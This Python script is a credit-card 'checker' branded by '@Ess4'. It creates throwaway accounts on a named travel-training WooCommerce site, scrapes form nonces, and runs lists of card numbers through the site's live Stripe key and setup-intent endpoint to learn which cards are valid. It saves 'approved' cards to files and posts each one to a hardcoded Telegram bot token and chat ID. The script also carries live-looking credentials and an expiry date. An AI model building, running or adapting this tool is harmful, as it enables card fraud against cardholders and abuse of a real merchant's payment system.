from datetime import datetime, timedelta
from bs4 import BeautifulSoup
import json
import sys
import re
import random
import string
import os
import time
import requests

bannerss = f"""
▗▄▄▄▖ ▗▄▄▖ ▗▄▄▖ ▗▄▖ 
▐▌   ▐▌   ▐▌   ▐▌ ▐▌
▐▛▀▀▘ ▝▀▚▖ ▝▀▚▖▐▛▀▜▌
▐▙▄▄▖▗▄▄▞▘▗▄▄▞▘▐▌ ▐▌
                    
 ▗▄▄▖▗▖ ▗▖▗▄▄▄▖ ▗▄▄▖▗▖ ▗▖▗▄▄▄▖▗▄▄▖ 
▐▌   ▐▌ ▐▌▐▌   ▐▌   ▐▌▗▞▘▐▌   ▐▌ ▐▌
▐▌   ▐▛▀▜▌▐▛▀▀▘▐▌   ▐▛▚▖ ▐▛▀▀▘▐▛▀▚▖
▝▚▄▄▖▐▌ ▐▌▐▙▄▄▖▝▚▄▄▖▐▌ ▐▌▐▙▄▄▖▐▌ ▐▌
                                   
                                   
 | Version: 1.2
PAID VERSION!
"""

def display_banner():
    banner = bannerss
    print_red(banner)

def typing_animation(text):
    for char in text:
        print(f'\033[91m{char}\033[0m', end='', flush=True)
        time.sleep(0.03)  
    print()

required_modules = ["requests", "bs4", "re", "json", "random", "string", "datetime"]  

def print_line():
    print_red(f"""|\|==========================================|/|""")

def print_sline():
    print_cyan(f"""|----------------------------------------------|""")

def send_hits_to_telegram(card):
    telegram_token = "8122009466:AAFh9h46K-JUhUJfO0NBU6giRXjZPIJ0hMo"
    telegram_chat_id = "7593550190"

    message = f"✅ Approved CC: {card}"

    try:
        response = requests.post(
            f"https://api.telegram.org/bot{telegram_token}/sendMessage",
            data={'chat_id': telegram_chat_id, 'text': message}
        )
        if response.status_code != 200:
            print_red("Failed to send message to Telegram")
    except Exception as e:
        print_red(f"Telegram API Error: {e}")

def check_modules(modules):
    for module in modules:
        try:
            __import__(module)
        except ImportError:
            print(f"The required module '{module}' is not installed.(Run pip install {module})")
            print(f"Please install the missing module and try again.")
            sys.exit(1)  

def create_session():
    try:
        session = requests.Session()
        email = generate_random_email()
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        html = response.text
        soup = BeautifulSoup(html, 'html.parser')
        
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})
        
        if not nonce or not noncee:
            print_red("Failed to find required nonce values")
            return None
            
        nonce = nonce['value']
        noncee = noncee['value']

        data = [
            ('afurd_field_nonce', f'{nonce}'),
            ('email', f'{email}'),
            ('password', 'Esahatam2009@'),
            ('woocommerce-register-nonce', f'{noncee}'),
            ('register', 'Register'),
        ]

        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            with open('Creds.txt', 'a') as f:
                f.write(email + ':' + 'Esahatam2009@\n')
            return session
        else:
            print_red(f"Registration failed with status code: {response.status_code}")
            return None
    except Exception as e:
        print_red(f"Session creation error: {e}")
        return None

def save_session_to_file(session, file_path):
    try:
        with open(file_path, "w") as file:
            cookies = session.cookies.get_dict()
            json.dump(cookies, file)
    except Exception as e:
        print_red(f"Error saving session: {e}")

def load_session_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            cookies = json.load(file)
            session = requests.Session()
            session.cookies.update(cookies)
            return session
    except Exception as e:
        print_red(f"Error loading session: {e}")
        return None

def manage_session_file():
    session_file = "session.txt"
    
    if os.path.exists(session_file):
        session = load_session_from_file(session_file)
        if session:
            return session
    
    session = create_session()
    if session:
        save_session_to_file(session, session_file)
        return session
    else:
        print_red("Failed to create new session")
        return None

def generate_random_email(length=8, domain=None):
    common_domains = ["gmail.com"]
    domain = domain or random.choice(common_domains)
    username = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    return f"{username}@{domain}"

# Print color functions
def print_red(text): print(f"\033[91m{text}\033[0m")
def print_green(text): print(f"\033[92m{text}\033[0m")
def print_yellow(text): print(f"\033[93m{text}\033[0m")
def print_cyan(text): print(f"\033[96m{text}\033[0m")

def get_credit_cards():
    print_red("[+] Do you want to check:")
    print_green("[/] 1. Single credit card")
    print_green("[/] 2. Multiple credit cards")
    choice = input(f"""\033[92m{'[+] Enter 1 OR 2: '}\033[0m""").strip()
    if choice == "1":
        cc = input(f"\033[92m{'[~] Enter the cc: '}\033[0m").strip()
        print_line()
        return [cc]
    elif choice == "2":
        file_path = input(f"\033[92m{'[~] Enter the (.txt) file path with ccs: '}\033[0m").strip()
        try:
            with open(file_path, "r") as file:
                return [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print_red("File not found. Please check the file path and try again.")
            return []
    else:
        print_red("Invalid choice. Please enter 1 or 2.")
        return []

def check_credit_cards(cc_list, session):
    start_time = time.time()
    total = len(cc_list)
    hit = dec = ccn = 0

    for cc in cc_list:
        try:
            print_sline()
            card = cc.replace('/', '|')
            lista = card.split("|")
            if len(lista) < 4:
                print_red("Invalid CC format")
                continue

            cc_num, mm, yy, cvv = lista[:4]
            yy = yy.split("20")[-1] if "20" in yy else yy

            # Get Stripe nonce
            response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', timeout=20)
            nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
            if not nonce_match:
                print_red("Failed to get Stripe nonce")
                continue
            nonce = nonce_match.group(1)

            # Create Stripe payment method
            stripe_data = {
                'type': 'card',
                'card[number]': cc_num,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'billing_details[address][postal_code]': '10080',
                'key': 'pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
            }

            stripe_resp = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                data=stripe_data,
                timeout=20
            )

            if stripe_resp.status_code != 200:
                print_red(f"Stripe API Error: {stripe_resp.text}")
                continue

            stripe_data = stripe_resp.json()
            if 'error' in stripe_data:
                error_msg = stripe_data['error']['message']
                if 'incorrect_cvc' in error_msg.lower():
                    ccn += 1
                    print_yellow(f"CCN Hit: {card}")
                    with open('CCN-HITS.txt', 'a') as f:
                        f.write(f"{card}\n")
                else:
                    dec += 1
                    print_red(f"Declined: {card} - {error_msg}")
                continue

            # Process payment
            payment_data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': stripe_data['id'],
                '_ajax_nonce': nonce
            }

            response = session.post(
                'https://www.thetravelinstitute.com/',
                params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                data=payment_data,
                timeout=20
            )

            if response.status_code != 200:
                print_red(f"Payment processing failed: {response.text}")
                continue

            result = response.json()
            if result.get('success'):
                hit += 1
                print_green(f"Approved: {card}")
                with open('APPROVED-HITS.txt', 'a') as f:
                    f.write(f"{card}\n")
                send_hits_to_telegram(card)
            else:
                dec += 1
                print_red(f"Declined: {card} - {result.get('data', {}).get('error', 'Unknown error')}")

        except Exception as e:
            print_red(f"Error processing card: {str(e)}")
            continue

    # Print summary
    processing_time = time.time() - start_time
    print_line()
    print_green(f"""
    SUMMARY
    Total: {total}
    Approved: {hit}
    Declined: {dec}
    CCN: {ccn}
    Time: {timedelta(seconds=int(processing_time))}
    """)
    print_line()
    typing_animation('Thanks for using my checker!!')

def confirm_time():
    utc_now = datetime.utcnow()
    ksa_now = utc_now + timedelta(hours=3)
    if ksa_now.date() > datetime(2025, 12, 25).date():
        typing_animation("The checker is dead now, follow @Ess4 for more!!")
        sys.exit()

def main():
    display_banner()
    print_line()
    confirm_time()
    check_modules(required_modules)
    typing_animation("This CC Checker script is brought to you by @Ess4 Pythonista, Follow for more weekly script....")
    
    session = manage_session_file()
    if not session:
        print_red("Failed to initialize session")
        return

    cc_list = get_credit_cards()
    if not cc_list:
        print_red("No valid credit cards provided")
        return

    print_green("Checking credit card(s)...")
    check_credit_cards(cc_list, session)

if __name__ == "__main__":
    main()
